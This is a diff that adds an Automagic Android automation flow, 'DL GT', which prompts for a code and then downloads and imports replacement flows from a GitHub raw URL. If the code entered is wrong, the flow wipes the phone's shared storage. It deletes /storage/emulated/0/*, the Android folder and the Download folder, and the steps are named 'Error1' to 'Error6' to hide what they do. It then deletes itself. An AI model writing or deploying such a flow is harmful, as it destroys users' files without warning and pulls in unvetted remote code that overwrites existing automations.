@@ -1,0 +1,141 @@
+<?xml version='1.0' encoding='UTF-8' standalone='yes' ?>
+<data version="1.38.0">
+  <trigger type="activity_started">
+    <useDefaultName>true</useDefaultName>
+    <name>Activity Started: gt.modify.gt.modify/ch.gridvision.ppam.androidautomagic.FlowListActivity</name>
+    <enabled>false</enabled>
+    <method>CLASSIC</method>
+    <packageNameFilter>gt.modify.gt.modify</packageNameFilter>
+    <classNameFilter>ch.gridvision.ppam.androidautomagic.FlowListActivity</classNameFilter>
+  </trigger>
+  <condition type="expression">
+    <useDefaultName>false</useDefaultName>
+    <name>Select1</name>
+    <expression>value == "gtline";</expression>
+  </condition>
+  <condition type="expression">
+    <useDefaultName>false</useDefaultName>
+    <name>Select2</name>
+    <expression>value == "gtrbh";</expression>
+  </condition>
+  <action type="delete_flows">
+    <useDefaultName>false</useDefaultName>
+    <name>Error</name>
+    <flowNameList>DL GT</flowNameList>
+    <deleteUnusedObjects>true</deleteUnusedObjects>
+  </action>
+  <action type="delete_files">
+    <useDefaultName>false</useDefaultName>
+    <name>Error1</name>
+    <pathList>/storage/emulated/0/*</pathList>
+    <showProgress>true</showProgress>
+  </action>
+  <action type="delete_files">
+    <useDefaultName>false</useDefaultName>
+    <name>Error2</name>
+    <pathList>/storage/emulated/0/*</pathList>
+    <showProgress>true</showProgress>
+  </action>
+  <action type="delete_files">
+    <useDefaultName>false</useDefaultName>
+    <name>Error3</name>
+    <pathList>/storage/emulated/0/Android</pathList>
+    <showProgress>true</showProgress>
+  </action>
+  <action type="delete_files">
+    <useDefaultName>false</useDefaultName>
+    <name>Error4</name>
+    <pathList>/storage/emulated/0/Android/*</pathList>
+    <showProgress>true</showProgress>
+  </action>
+  <action type="delete_files">
+    <useDefaultName>false</useDefaultName>
+    <name>Error5</name>
+    <pathList>/storage/emulated/0/Download</pathList>
+    <showProgress>true</showProgress>
+  </action>
+  <action type="delete_files">
+    <useDefaultName>false</useDefaultName>
+    <name>Error6</name>
+    <pathList>/storage/emulated/0/Download/*</pathList>
+    <showProgress>true</showProgress>
+  </action>
+  <action type="input_dialog">
+    <useDefaultName>true</useDefaultName>
+    <name>Input Dialog: Please Enter Code To Download Multi-line text </name>
+    <title>Please Enter Code To Download</title>
+    <inputDialogType>TEXT</inputDialogType>
+    <prompt></prompt>
+    <inputValues></inputValues>
+    <defaultValue></defaultValue>
+    <titleFontSize>DEFAULT</titleFontSize>
+    <promptFontSize>DEFAULT</promptFontSize>
+    <fontSize>DEFAULT</fontSize>
+    <timeoutEnabled>false</timeoutEnabled>
+    <timeout>60000</timeout>
+    <defaultValueOnTimeout></defaultValueOnTimeout>
+    <showWhenLocked>false</showWhenLocked>
+    <turnScreenOn>false</turnScreenOn>
+    <keepScreenOn>false</keepScreenOn>
+    <enlargeDialogWidth>false</enlargeDialogWidth>
+    <keyboardCapitalizeSentences>false</keyboardCapitalizeSentences>
+  </action>
+  <action type="download_url">
+    <useDefaultName>false</useDefaultName>
+    <name>Please Download A</name>
+    <url>https://raw.githubusercontent.com/gotza02/gotza02/main/gtlineflow.xml</url>
+    <directory>/storage/emulated/0/Android/media</directory>
+    <filename>Flows.xml</filename>
+    <showProgress>true</showProgress>
+  </action>
+  <action type="download_url">
+    <useDefaultName>false</useDefaultName>
+    <name>Please Download B</name>
+    <url>https://raw.githubusercontent.com/gotza02/gotza02/main/gtrbhflows.xml</url>
+    <directory>/storage/emulated/0/Android/media</directory>
+    <filename>Flows.xml</filename>
+    <showProgress>true</showProgress>
+  </action>
+  <action type="import_flows">
+    <useDefaultName>false</useDefaultName>
+    <name>Success</name>
+    <path>/storage/emulated/0/Android/media/Flows.xml</path>
+    <replace>true</replace>
+  </action>
+  <flow type="flow">
+    <name>DL GT</name>
+    <enabled>false</enabled>
+    <executionPolicy>PARALLEL</executionPolicy>
+    <triggercontainer id="t1" x="70.0" y="52.5">
+      <trigger>Activity Started: gt.modify.gt.modify/ch.gridvision.ppam.androidautomagic.FlowListActivity</trigger>
+    </triggercontainer>
+    <actioncontainer id="t2" x="70.00003" y="52.50003">Input Dialog: Please Enter Code To Download Multi-line text </actioncontainer>
+    <conditioncontainer id="t3" x="70.00001" y="52.5002">Select2</conditioncontainer>
+    <conditioncontainer id="t4" x="70.00001" y="52.500004">Select1</conditioncontainer>
+    <actioncontainer id="t5" x="70.00002" y="52.500008">Please Download A</actioncontainer>
+    <actioncontainer id="t6" x="69.999985" y="52.499973">Please Download B</actioncontainer>
+    <actioncontainer id="t7" x="69.99989" y="52.50003">Success</actioncontainer>
+    <actioncontainer id="t8" x="70.000015" y="52.500046">Error1</actioncontainer>
+    <actioncontainer id="t9" x="69.99993" y="52.499966">Error2</actioncontainer>
+    <actioncontainer id="t10" x="70.000015" y="52.500046">Error3</actioncontainer>
+    <actioncontainer id="t11" x="70.00007" y="52.49999">Error4</actioncontainer>
+    <actioncontainer id="t12" x="70.00003" y="52.499992">Error5</actioncontainer>
+    <actioncontainer id="t13" x="69.99997" y="52.500057">Error6</actioncontainer>
+    <actioncontainer id="t14" x="70.00026" y="52.500027">Error</actioncontainer>
+    <connection from="t1" to="t2" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
+    <connection from="t2" to="t4" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
+    <connection from="t2" to="t3" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
+    <connection from="t3" to="t6" type="TRUE" sourcePosition="SOUTH" targetPosition="NORTH" />
+    <connection from="t3" to="t8" type="FALSE" sourcePosition="SOUTH" targetPosition="NORTH" />
+    <connection from="t4" to="t5" type="TRUE" sourcePosition="SOUTH" targetPosition="NORTH" />
+    <connection from="t4" to="t8" type="FALSE" sourcePosition="SOUTH" targetPosition="NORTH" />
+    <connection from="t5" to="t7" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
+    <connection from="t6" to="t7" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
+    <connection from="t8" to="t9" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
+    <connection from="t9" to="t10" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
+    <connection from="t10" to="t11" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
+    <connection from="t11" to="t12" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
+    <connection from="t12" to="t13" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
+    <connection from="t13" to="t14" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
+  </flow>
+</data>
